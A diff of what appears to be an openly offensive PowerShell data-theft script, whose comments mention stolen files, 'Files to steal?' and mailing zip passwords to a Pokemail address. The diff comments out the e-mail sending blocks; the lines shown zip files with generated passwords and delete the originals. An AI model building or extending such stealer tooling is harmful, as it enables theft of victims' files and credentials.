@@ -52,7 +52,7 @@ Write-Host "[+] Zipping files!" -ForegroundColor Green
 Compress-7Zip -Path c:\temp\sys.txt -ArchiveFileName c:\temp\backup.zip -Format Zip -Password "$IV11"
 Remove-Item c:\temp\sys.txt
 Write-Host "[+] File zipped!" -ForegroundColor Green
-
+<#
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Send certificate password via encrypted zip file to Pokemail e-mail
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -78,7 +78,7 @@ Start-Sleep -s 2
 Write-Host "[-] Deleting files" -ForegroundColor Red
 #Remove-Item c:\temp\sys.txt
 #Remove-Item c:\temp\backup.zip
-
+#>
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Password generator for the zip encrypted stolen files
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -90,7 +90,7 @@ Write-Host "[+] Zipping files!" -ForegroundColor Green
 Compress-7Zip -Path c:\temp\sys1.txt -ArchiveFileName c:\temp\backup1.zip -Format Zip -Password "$IV1"
 Remove-Item c:\temp\sys1.txt
 Write-Host "[+] File zipped!" -ForegroundColor Green
-
+<#
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Send password for files to your e-mail
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -116,7 +116,7 @@ Start-Sleep -s 2
 Write-Host "[-] Deleting files" -ForegroundColor Red
 #Remove-Item c:\temp\sys1.txt
 #Remove-Item c:\temp\backup1.zip
-
+#>
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Files to steal?
 #----------------------------------------------------------------------------------------------------------------------------------------
